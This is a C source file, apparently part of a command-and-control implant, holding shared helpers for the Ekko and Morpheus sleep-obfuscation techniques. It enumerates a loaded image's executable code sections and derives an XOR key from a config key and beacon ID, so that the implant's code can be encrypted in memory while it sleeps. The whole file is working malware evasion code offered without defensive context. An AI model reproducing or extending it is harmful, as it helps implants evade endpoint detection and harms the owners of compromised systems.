/* ---------------------------------------------------------------------------
 * Shared sleep utility functions used by both Ekko and Morpheus.
 * These run BEFORE code sections are encrypted, so they can safely live in
 * the .text section.
 * ========================================================================== */
#include "../include/sleep_utils.h"

__attribute__((noinline))
int enumerateCodeSections(PVOID imageBase, SleepSectionInfo* sections, int maxSections) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)imageBase + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((BYTE*)nt + sizeof(IMAGE_NT_HEADERS));

    int count = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections && count < maxSections; i++) {
        uintptr_t secVA = (uintptr_t)imageBase + sec[i].VirtualAddress;
        SIZE_T secSize = (sec[i].SizeOfRawData > sec[i].Misc.VirtualSize)
                         ? sec[i].SizeOfRawData : sec[i].Misc.VirtualSize;

        const char* secName = (const char*)sec[i].Name;
        if (secName[0] == '.' && secName[1] == 'o' && secName[2] == 'b' && secName[3] == 'f')
            continue;

        if ((sec[i].Characteristics & IMAGE_SCN_CNT_CODE) && (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            sections[count].base = (PVOID)secVA;
            sections[count].size = secSize;
            sections[count].oldProtect = 0;
            count++;
        }
    }
    return count;
}

__attribute__((noinline))
void deriveXorKey(uint8_t out[SLEEP_XOR_KEY_LENGTH], const uint8_t configKey[32], const uint8_t beaconId[8]) {
    uint8_t seed[32];
    for (int i = 0; i < 8; i++) seed[i] = configKey[i] ^ beaconId[i];
    for (int i = 8; i < 32; i++) seed[i] = configKey[i];
    for (int i = 0; i < SLEEP_XOR_KEY_LENGTH; i++)
        out[i] = seed[i % 32] ^ (uint8_t)(i / 32);
}
